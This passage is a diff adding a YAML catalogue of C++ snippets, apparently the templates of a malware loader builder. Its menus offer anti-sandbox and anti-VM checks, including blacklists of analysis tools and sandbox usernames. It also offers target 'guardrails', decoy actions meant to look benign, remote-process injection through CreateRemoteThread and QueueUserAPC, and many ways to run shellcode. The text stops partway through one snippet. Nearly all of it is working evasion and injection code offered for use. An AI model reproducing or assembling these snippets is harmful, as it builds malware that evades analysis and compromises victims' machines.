+          WCHAR username[256];
+          DWORD size = 256;
+          if (GetUserNameW(username, &size)) {
+              _wcslwr_s(username, 256);
+              const wchar_t* sandboxUsers[] = {
+                  L"sandbox", L"virus", L"malware", L"maltest", L"test",
+                  L"sample", L"vmware", L"vbox", L"analysis", L"cuckoo",
+                  L"john doe", L"user", L"currentuser", L"admin"
+              };
+              for (int i = 0; i < 14; i++) {
+                  if (wcsstr(username, sandboxUsers[i])) {
+                      return 0;
+                  }
+              }
+          }
+      }
+  - id: RecentFilesCheck
+    display: Recent Files Check
+    default: false
+    snippet: |
+      // Anti-sandbox: Check for user activity (recent files)
+      // Sandboxes typically have no user activity
+      {
+          WCHAR recentPath[MAX_PATH];
+          if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recentPath))) {
+              WIN32_FIND_DATAW fd;
+              WCHAR searchPath[MAX_PATH];
+              wsprintfW(searchPath, L"%s\\*", recentPath);
+              HANDLE hFind = FindFirstFileW(searchPath, &fd);
+              if (hFind != INVALID_HANDLE_VALUE) {
+                  int fileCount = 0;
+                  do {
+                      if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                          fileCount++;
+                      }
+                  } while (FindNextFileW(hFind, &fd) && fileCount < 10);
+                  FindClose(hFind);
+                  
+                  if (fileCount < 5) {
+                      // Too few recent files - likely sandbox
+                      return 0;
+                  }
+              }
+          }
+      }
+
+  - id: ScreenResolutionCheck
+    display: Screen Resolution Check
+    default: false
+    snippet: |
+      // Anti-sandbox: Check screen resolution
+      // Sandboxes often use low/unusual resolutions
+      {
+          int width = GetSystemMetrics(SM_CXSCREEN);
+          int height = GetSystemMetrics(SM_CYSCREEN);
+          
+          // Most real systems have at least 1024x768
+          if (width < 1024 || height < 768) {
+              return 0;
+          }
+          
+          // Check for suspicious exact sandbox resolutions
+          if (width == 800 && height == 600) {
+              return 0;
+          }
+      }
+
+  - id: FileTimeCheck
+    display: Installation Age Check
+    default: false
+    snippet: |
+      // Anti-sandbox: Check if Windows was recently installed
+      // Sandboxes have recent install times
+      {
+          WCHAR windowsDir[MAX_PATH];
+          if (GetWindowsDirectoryW(windowsDir, MAX_PATH)) {
+              WIN32_FILE_ATTRIBUTE_DATA fileInfo;
+              if (GetFileAttributesExW(windowsDir, GetFileExInfoStandard, &fileInfo)) {
+                  FILETIME now;
+                  GetSystemTimeAsFileTime(&now);
+                  
+                  ULARGE_INTEGER installTime, currentTime;
+                  installTime.LowPart = fileInfo.ftCreationTime.dwLowDateTime;
+                  installTime.HighPart = fileInfo.ftCreationTime.dwHighDateTime;
+                  currentTime.LowPart = now.dwLowDateTime;
+                  currentTime.HighPart = now.dwHighDateTime;
+                  
+                  // Check if installed less than 1 day ago (in 100ns intervals)
+                  ULONGLONG oneDay = 10000000ULL * 60 * 60 * 24;
+                  if (currentTime.QuadPart - installTime.QuadPart < oneDay) {
+                      return 0;
+                  }
+              }
+          }
+      }
+
+  - id: AllVMChecks
+    display: All VM Detection Methods
+    default: true
+    snippet: |
+      // Comprehensive VM detection
+      {
+          // CPUID hypervisor bit
+          int cpu[4];
+          __cpuid(cpu, 1);
+          if (cpu[2] & (1 << 31)) return 0;
+
+          // CPUID VM vendor
+          __cpuid(cpu, 0x40000000);
+          char vendor[13] = {0};
+          memcpy(vendor, &cpu[1], 4);
+          memcpy(vendor + 4, &cpu[2], 4);
+          memcpy(vendor + 8, &cpu[3], 4);
+          if (strstr(vendor, "VMware") || strstr(vendor, "VBox") || 
+              strstr(vendor, "Microsoft Hv") || strstr(vendor, "KVM")) return 0;
+
+          // Resources
+          MEMORYSTATUSEX mem = {sizeof(mem)};
+          GlobalMemoryStatusEx(&mem);
+          if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return 0; // < 4GB
+
+          SYSTEM_INFO si;
+          GetSystemInfo(&si);
+          if (si.dwNumberOfProcessors < 2) return 0;
+
+          ULARGE_INTEGER disk;
+          GetDiskFreeSpaceExW(L"C:\\", NULL, &disk, NULL);
+          if (disk.QuadPart < 80ULL * 1024 * 1024 * 1024) return 0; // < 80GB
+
+          // Screen
+          if (GetSystemMetrics(SM_CXSCREEN) < 1280) return 0;
+          if (GetSystemMetrics(SM_CYSCREEN) < 720) return 0;
+      }
+
+  - id: ProcessBlacklist
+    display: Process Blacklist (Extended)
+    default: true
+    snippet: |
+      {
+          const wchar_t* blacklist[] = {
+              L"vmtoolsd.exe", L"vmwaretray.exe", L"vboxservice.exe", L"vboxtray.exe",
+              L"procmon.exe", L"procexp.exe", L"wireshark.exe", L"fiddler.exe",
+              L"x64dbg.exe", L"x32dbg.exe", L"ollydbg.exe", L"idaq.exe", L"idaq64.exe",
+              L"sandboxie.exe", L"sniff_hit.exe", L"sysmon.exe", L"joeboxcontrol.exe",
+              L"hookanaapp.exe", L"dumpcap.exe", L"importrec.exe"
+          };
+          
+          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (snap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe = {sizeof(pe)};
+              if (Process32FirstW(snap, &pe)) {
+                  do {
+                      for (int i = 0; i < 20; i++) {
+                          if (_wcsicmp(pe.szExeFile, blacklist[i]) == 0) {
+                              CloseHandle(snap);
+                              return 0;
+                          }
+                      }
+                  } while (Process32NextW(snap, &pe));
+              }
+              CloseHandle(snap);
+          }
+      }
+
+  - id: UsernameBlacklist
+    display: Username Blacklist
+    default: true
+    snippet: |
+      {
+          WCHAR user[256];
+          DWORD size = 256;
+          GetUserNameW(user, &size);
+          _wcslwr_s(user, 256);
+          
+          const wchar_t* badUsers[] = {
+              L"sandbox", L"malware", L"virus", L"sample", L"test",
+              L"analysis", L"cuckoo", L"vmware", L"user", L"john doe"
+          };
+          for (int i = 0; i < 10; i++) {
+              if (wcsstr(user, badUsers[i])) return 0;
+          }
+      }
+
+  - id: AllChecks
+    display: Comprehensive VM/Sandbox Detection
+    default: true
+    snippet: |
+      // Combined sandbox detection checks
+      {
+          // Check 1: Hypervisor bit
+          int cpuInfo[4];
+          __cpuid(cpuInfo, 1);
+          if (cpuInfo[2] & (1 << 31)) return 0;
+
+          // Check 2: Low resources
+          MEMORYSTATUSEX mem = {sizeof(mem)};
+          if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 3ULL * 1024 * 1024 * 1024) return 0;
+
+          // Check 3: Processor count
+          SYSTEM_INFO si;
+          GetSystemInfo(&si);
+          if (si.dwNumberOfProcessors < 2) return 0;
+
+          // Check 4: Recent files
+          WCHAR recent[MAX_PATH];
+          if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recent))) {
+              WIN32_FIND_DATAW fd;
+              WCHAR search[MAX_PATH];
+              wsprintfW(search, L"%s\\*", recent);
+              HANDLE hf = FindFirstFileW(search, &fd);
+              int count = 0;
+              if (hf != INVALID_HANDLE_VALUE) {
+                  do { if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) count++; }
+                  while (FindNextFileW(hf, &fd) && count < 10);
+                  FindClose(hf);
+              }
+              if (count < 3) return 0;
+          }
+
+          // Check 5: Screen resolution
+          if (GetSystemMetrics(SM_CXSCREEN) < 1024) return 0;
+      }
+  - id: AnalysisProcesses
+    display: Analysis Process Detection
+    default: true
+    snippet: |
+      // Detect analysis tools
+      {
+          const wchar_t* procs[] = {
+              L"procmon.exe", L"procexp.exe", L"wireshark.exe",
+              L"x64dbg.exe", L"ida.exe", L"idaq64.exe",
+              L"ollydbg.exe", L"fiddler.exe", L"processhacker.exe"
+          };
+          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (snap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe = {sizeof(pe)};
+              if (Process32FirstW(snap, &pe)) {
+                  do {
+                      for (int i = 0; i < 9; i++) {
+                          if (_wcsicmp(pe.szExeFile, procs[i]) == 0) {
+                              CloseHandle(snap);
+                              return 0;
+                          }
+                      }
+                  } while (Process32NextW(snap, &pe));
+              }
+              CloseHandle(snap);
+          }
+      }
+- header: Guardrails
+  template: guardrail
+  display: Guardrails
+  allowMultiple: true
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    snippet: |
+      // No guardrails
+  - id: EnvVarExists
+    display: Environment Variable Exists
+    default: false
+    inputs:
+    - id: env_var_name
+      label: Variable name
+      type: textbox
+      placement: after
+      required: true
+      width: 180
+      placeholder: COMPUTERNAME
+      defaultValue: COMPUTERNAME
+      infoAction: EnvVarNameInfo
+      infoButtonLabel: Examples
+    snippet: |
+      // Guardrail: Require environment variable to exist
+      if (GetEnvironmentVariableW(L"$env_var_name$", nullptr, 0) == 0) {
+          return 0;
+      }
+  - id: EnvVarContains
+    display: Environment Variable Contains Value
+    default: false
+    inputs:
+    - id: env_var_name
+      label: Variable name
+      type: textbox
+      placement: after
+      required: true
+      width: 180
+      placeholder: COMPUTERNAME
+      defaultValue: COMPUTERNAME
+      infoAction: EnvVarNameInfo
+      infoButtonLabel: Examples
+    - id: env_var_value
+      label: Expected value
+      type: textbox
+      placement: after
+      required: true
+      width: 180
+      placeholder: TARGET
+      defaultValue: TARGET
+      infoAction: EnvVarValueInfo
+      infoButtonLabel: Examples
+    snippet: |
+      // Guardrail: Environment variable must contain specific value
+      {
+          auto my_tolower = [](char c) -> char {
+              return (c >= 'A' && c <= 'Z') ? c + 32 : c;
+          };
+          
+          auto contains_ci = [&my_tolower](const char* haystack, const char* needle) -> bool {
+              if (!haystack || !needle) return false;
+              for (; *haystack; haystack++) {
+                  const char* h = haystack;
+                  const char* n = needle;
+                  while (*h && *n && my_tolower(*h) == my_tolower(*n)) { h++; n++; }
+                  if (*n == '\0') return true;
+              }
+              return false;
+          };
+          
+          char buffer[1024];
+          DWORD result = GetEnvironmentVariableA("$env_var_name$", buffer, 1024);
+          if (result == 0 || !contains_ci(buffer, "$env_var_value$")) {
+              return 0;
+          }
+      }
+
+  - id: DomainCheck
+    display: Domain Membership Check
+    default: false
+    snippet: |
+      // Guardrail: Require domain membership
+      {
+          WCHAR domainName[256];
+          DWORD size = 256;
+          NETSETUP_JOIN_STATUS status;
+          if (NetGetJoinInformation(NULL, (LPWSTR*)&domainName, &status) == NERR_Success) {
+              if (status != NetSetupDomainName) {
+                  NetApiBufferFree(domainName);
+                  return 0; // Not joined to a domain
+              }
+              // Optionally check specific domain
+              // if (_wcsicmp(domainName, L"TARGETDOMAIN") != 0) return 0;
+              NetApiBufferFree(domainName);
+          }
+      }
+  - id: DateRangeCheck
+    display: Execution Date Range
+    default: false
+    inputs:
+    - id: start_date
+      label: Start date (YYYYMMDD)
+      type: textbox
+      placement: after
+      required: true
+      width: 100
+      placeholder: 20240101
+      defaultValue: 20240101
+      infoAction: DateRangeInfo
+      infoButtonLabel: Format
+    - id: end_date
+      label: End date (YYYYMMDD)
+      type: textbox
+      placement: after
+      required: true
+      width: 100
+      placeholder: 20251231
+      defaultValue: 20251231
+      infoAction: DateRangeInfo
+      infoButtonLabel: Format
+    snippet: |
+      // Guardrail: Only execute within date range
+      {
+          SYSTEMTIME st;
+          GetLocalTime(&st);
+          
+          DWORD current = (DWORD)((st.wYear * 10000) + (st.wMonth * 100) + st.wDay);
+          DWORD start = $start_date$;
+          DWORD end = $end_date$;
+          
+          if (current < start || current > end) {
+              return 0;
+          }
+      }
+
+  - id: FileExistsCheck
+    display: Required File Exists
+    default: false
+    inputs:
+    - id: file_path
+      label: File path
+      type: textbox
+      placement: after
+      required: true
+      width: 240
+      placeholder: C:\\target\\marker.txt
+      defaultValue: C:\\target\\marker.txt
+      infoAction: FilePathInfo
+      infoButtonLabel: Examples
+    snippet: |
+      // Guardrail: Required file must exist
+      {
+          DWORD attr = GetFileAttributesW(L"$file_path$");
+          if (attr == INVALID_FILE_ATTRIBUTES) {
+              return 0;
+          }
+      }
+  - id: DomainMembership
+    display: Require Domain Membership
+    default: true
+    snippet: |
+      {
+          LPWSTR domain = NULL;
+          NETSETUP_JOIN_STATUS status;
+          if (NetGetJoinInformation(NULL, &domain, &status) == NERR_Success) {
+              BOOL isDomain = (status == NetSetupDomainName);
+              NetApiBufferFree(domain);
+              if (!isDomain) return 0;
+          }
+      }
+  - id: UserActivity
+    display: Require User Activity
+    default: true
+    snippet: |
+      {
+          LASTINPUTINFO lii = {sizeof(lii)};
+          if (GetLastInputInfo(&lii)) {
+              DWORD idle = (GetTickCount() - lii.dwTime) / 1000;
+              if (idle > 1800) return 0; // 30 min idle = suspicious
+          }
+      }
+  - id: MinRecentFiles
+    display: Require Recent User Files
+    default: true
+    snippet: |
+      {
+          WCHAR recent[MAX_PATH];
+          if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recent))) {
+              WIN32_FIND_DATAW fd;
+              WCHAR search[MAX_PATH];
+              wsprintfW(search, L"%s\\*", recent);
+              HANDLE hf = FindFirstFileW(search, &fd);
+              int count = 0;
+              if (hf != INVALID_HANDLE_VALUE) {
+                  do { if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) count++; }
+                  while (FindNextFileW(hf, &fd) && count < 20);
+                  FindClose(hf);
+              }
+              if (count < 5) return 0;
+          }
+      }
+  - id: DomainJoined
+    display: Require Domain Membership
+    default: false
+    snippet: |
+      {
+          WCHAR domain[256];
+          DWORD size = 256;
+          NETSETUP_JOIN_STATUS status;
+          if (NetGetJoinInformation(NULL, (LPWSTR*)&domain, &status) == NERR_Success) {
+              if (status != NetSetupDomainName) {
+                  NetApiBufferFree(domain);
+                  return 0;
+              }
+              NetApiBufferFree(domain);
+          }
+      }
+- header: Decoy
+  template: decoy
+  display: Decoy Operations
+  allowMultiple: true
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    snippet: |
+      // No decoy operations
+  - id: OpenNotepad
+    display: Open Notepad
+    default: false
+    snippet: |
+      // Decoy: Open notepad to appear benign
+      WinExec("C:\\Windows\\System32\\notepad.exe", SW_HIDE);
+  - id: OpenCalculator
+    display: Open Calculator
+    default: false
+    snippet: |
+      // Decoy: Open calculator
+      WinExec("calc.exe", SW_HIDE);
+  - id: ShowMessageBox
+    display: Show Fake Error
+    default: false
+    snippet: |
+      // Decoy: Show fake error message
+      MessageBoxW(NULL, L"Application failed to initialize correctly.", L"Error", MB_ICONERROR | MB_OK);
+  - id: CreateDummyFiles
+    display: Create Dummy Files
+    default: false
+    snippet: |
+      // Decoy: Create benign-looking temporary files
+      {
+          WCHAR tempPath[MAX_PATH];
+          if (GetTempPathW(MAX_PATH, tempPath)) {
+              WCHAR filePath[MAX_PATH];
+              wsprintfW(filePath, L"%s\\update_check.tmp", tempPath);
+              HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+              if (hFile != INVALID_HANDLE_VALUE) {
+                  const char* data = "version=1.0.0\nstatus=ok\n";
+                  DWORD written;
+                  WriteFile(hFile, data, (DWORD)strlen(data), &written, NULL);
+                  CloseHandle(hFile);
+              }
+          }
+      }
+- header: Process Injection
+  template: psinjection
+  display: Process Injection
+  allowMultiple: false
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    snippet: |
+      // No process injection
+  - id: MpfProcessInjectionViaProcessReflection
+    display: Process Reflection Injection
+    default: false
+    snippet: |
+      // Process injection via NtCreateSection + NtMapViewOfSection
+      {
+          typedef NTSTATUS (NTAPI *pNtCS)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+          typedef NTSTATUS (NTAPI *pNtMVOS)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
+          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+          pNtCS NtCS = (pNtCS)GetProcAddress(ntdll, "NtCreateSection");
+          pNtMVOS NtMVOS = (pNtMVOS)GetProcAddress(ntdll, "NtMapViewOfSection");
+          if (NtCS && NtMVOS) {
+              HANDLE hSection = NULL;
+              LARGE_INTEGER secSize = {0};
+              secSize.QuadPart = code_blob_len;
+              if (NtCS(&hSection, SECTION_ALL_ACCESS, NULL, &secSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) >= 0) {
+                  PVOID localBase = NULL;
+                  SIZE_T viewSize = 0;
+                  NtMVOS(hSection, GetCurrentProcess(), &localBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
+                  if (localBase) {
+                      memcpy(localBase, code_blob, code_blob_len);
+                      PVOID remoteBase = NULL;
+                      SIZE_T remoteSize = 0;
+                      NtMVOS(hSection, GetCurrentProcess(), &remoteBase, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ);
+                      if (remoteBase) {
+                          HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);
+                          if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }
+                      }
+                  }
+                  CloseHandle(hSection);
+              }
+          }
+      }
+
+  - id: ClassicRemoteThread
+    display: Classic Remote Thread Injection
+    default: false
+    inputs:
+    - id: psname
+      label: Target process
+      type: textbox
+      placement: after
+      required: true
+      width: 180
+      placeholder: notepad.exe
+      defaultValue: notepad.exe
+      infoAction: PsInjTargetInfo
+      infoButtonLabel: Examples
+    snippet: |
+      // Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+      {
+          HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (hSnap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe32 = {sizeof(pe32)};
+              DWORD targetPid = 0;
+              if (Process32FirstW(hSnap, &pe32)) {
+                  do {
+                      if (_wcsicmp(pe32.szExeFile, L"$psname$") == 0) {
+                          targetPid = pe32.th32ProcessID;
+                          break;
+                      }
+                  } while (Process32NextW(hSnap, &pe32));
+              }
+              CloseHandle(hSnap);
+              
+              if (targetPid) {
+                  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+                  if (hProc) {
+                      LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                      if (remoteMem) {
+                          SIZE_T written;
+                          if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {
+                              HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
+                              if (hThread) {
+                                  WaitForSingleObject(hThread, INFINITE);
+                                  CloseHandle(hThread);
+                              }
+                          }
+                      }
+                      CloseHandle(hProc);
+                  }
+              }
+          }
+      }
+
+  - id: QueueUserAPC
+    display: QueueUserAPC Injection
+    default: false
+    inputs:
+    - id: psname
+      label: Target process
+      type: textbox
+      placement: after
+      required: true
+      width: 180
+      placeholder: notepad.exe
+      defaultValue: notepad.exe
+      infoAction: PsInjTargetInfo
+      infoButtonLabel: Examples
+    snippet: |
+      // QueueUserAPC injection into target process
+      {
+          HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
+          if (hSnap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe32 = {sizeof(pe32)};
+              DWORD targetPid = 0;
+              if (Process32FirstW(hSnap, &pe32)) {
+                  do {
+                      if (_wcsicmp(pe32.szExeFile, L"$psname$") == 0) {
+                          targetPid = pe32.th32ProcessID;
+                          break;
+                      }
+                  } while (Process32NextW(hSnap, &pe32));
+              }
+              
+              if (targetPid) {
+                  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+                  if (hProc) {
+                      LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                      if (remoteMem) {
+                          SIZE_T written;
+                          if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {
+                              THREADENTRY32 te32 = {sizeof(te32)};
+                              if (Thread32First(hSnap, &te32)) {
+                                  do {
+                                      if (te32.th32OwnerProcessID == targetPid) {
+                                          HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
+                                          if (hThread) {
+                                              QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);
+                                              CloseHandle(hThread);
+                                          }
+                                      }
+                                  } while (Thread32Next(hSnap, &te32));
+                              }
+                          }
+                      }
+                      CloseHandle(hProc);
+                  }
+              }
+              CloseHandle(hSnap);
+          }
+      }
+
+- header: Shellcode Execution
+  template: shellcodeexecution
+  display: Shellcode Execution
+  allowMultiple: false
+  items:
+  - id: VirtualAllocExec
+    display: VirtualAlloc + Function Pointer
+    default: true
+    snippet: |
+      // Execute via VirtualAlloc + function pointer
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
+              VirtualFree(execMem, 0, MEM_RELEASE);
+              return -1;
+          }
+          
+          ((void(*)())execMem)();
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
+  - id: HeapExec
+    display: HeapAlloc + VirtualProtect
+    default: false
+    snippet: |
+      // Execute via HeapAlloc (less suspicious than VirtualAlloc)
+      {
+          HANDLE hHeap = GetProcessHeap();
+          void* execMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, code_blob_len);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
+              HeapFree(hHeap, 0, execMem);
+              return -1;
+          }
+          
+          __try { ((void(*)())execMem)(); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
+          
+          VirtualProtect(execMem, code_blob_len, oldProtect, &oldProtect);
+          HeapFree(hHeap, 0, execMem);
+      }
+
+  - id: CreateThread
+    display: CreateThread Execution
+    default: false
+    snippet: |
+      // Execute via CreateThread
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
+          if (hThread) {
+              WaitForSingleObject(hThread, INFINITE);
+              CloseHandle(hThread);
+          }
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
+  - id: NtCreateThreadEx
+    display: NtCreateThreadEx (Direct Syscall)
+    default: false
+    snippet: |
+      // Execute via NtCreateThreadEx
+      {
+          typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+          
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+          if (ntdll) {
+              pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+              if (NtCreateThreadEx) {
+                  HANDLE hThread = NULL;
+                  NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), 
+                                                     execMem, NULL, 0, 0, 0, 0, NULL);
+                  if (hThread) {
+                      WaitForSingleObject(hThread, INFINITE);
+                      CloseHandle(hThread);
+                  }
+              }
+          }
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
+  - id: FiberExec
+    display: Fiber Execution
+    default: false
+    snippet: |
+      // Execute via Fibers
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          PVOID mainFiber = ConvertThreadToFiber(NULL);
+          if (mainFiber) {
+              PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
+              if (shellcodeFiber) {
+                  __try { SwitchToFiber(shellcodeFiber); }
+                  __except(EXCEPTION_EXECUTE_HANDLER) {}
+                  DeleteFiber(shellcodeFiber);
+              }
+              ConvertFiberToThread();
+          }
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
+  - id: CallbackExec
+    display: Callback Function Execution
+    default: false
+    snippet: |
+      // Execute via callback function (EnumWindows)
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          __try { EnumWindows((WNDENUMPROC)execMem, 0); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
+  - id: ThreadPoolExec
+    display: Thread Pool Execution
+    default: false
+    snippet: |
+      // Execute via Windows Thread Pool
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect);
+          
+          PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)execMem, NULL, NULL);
+          if (work) {
+              SubmitThreadpoolWork(work);
+              WaitForThreadpoolWorkCallbacks(work, FALSE);
+              CloseThreadpoolWork(work);
+          }
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
+  - id: SecureExec
+    display: Secure Execution with Full Cleanup
+    default: false
+    snippet: |
+      // Paranoid execution with memory zeroing
+      {
+          static volatile BOOL g_SafeToRun = TRUE;
+          if (!g_SafeToRun) return 0;
+          
+          void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (!mem) return -1;
+          
+          // Copy and zero original
+          memcpy(mem, code_blob, code_blob_len);
+          SecureZeroMemory(code_blob, code_blob_len);
+          
+          DWORD old;
+          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
+          
+          // Final check before execution
+          if (!g_SafeToRun) { VirtualFree(mem, 0, MEM_RELEASE); return 0; }
+          
+          __try { ((void(*)())mem)(); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
+          
+          // Cleanup
+          VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
+          SecureZeroMemory(mem, code_blob_len);
+          VirtualFree(mem, 0, MEM_RELEASE);
+      }
+
+  - id: RWtoRX
+    display: RW Alloc → RX Protect
+    default: false
+    snippet: |
+      // Allocate RW, copy, then protect as RX (not RWX)
+      {
+          void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (!mem) return -1;
+          memcpy(mem, code_blob, code_blob_len);
+          DWORD old;
+          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
+          __try { ((void(*)())mem)(); }
+          __except(EXCEPTION_EXECUTE_HANDLER) {}
+          VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);
+          SecureZeroMemory(mem, code_blob_len);
+          VirtualFree(mem, 0, MEM_RELEASE);
+      }
+  - id: SyscallExec
+    display: Direct Syscall Execution
+    default: false
+    snippet: |
+      // Execute via NtCreateThreadEx (direct syscall)
+      {
+          typedef NTSTATUS (NTAPI *pNtCTE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+          void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          memcpy(mem, code_blob, code_blob_len);
+          DWORD old;
+          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);
+          
+          pNtCTE NtCTE = (pNtCTE)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
+          HANDLE hThread = NULL;
+          if (NtCTE) {
+              NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), mem, NULL, 0, 0, 0, 0, NULL);
+              if (hThread) {
+                  WaitForSingleObject(hThread, INFINITE);
+                  CloseHandle(hThread);
+              }
+          }
+          VirtualFree(mem, 0, MEM_RELEASE);
+      }
+
+  - id: DirectExec
+    display: Direct Function Pointer
+    default: false
+    snippet: |
+      // Minimal execution via VirtualAlloc + function pointer
+      void* m = VirtualAlloc(0, code_blob_len, 0x3000, 0x40);
+      if (m) {
+          memcpy(m, code_blob, code_blob_len);
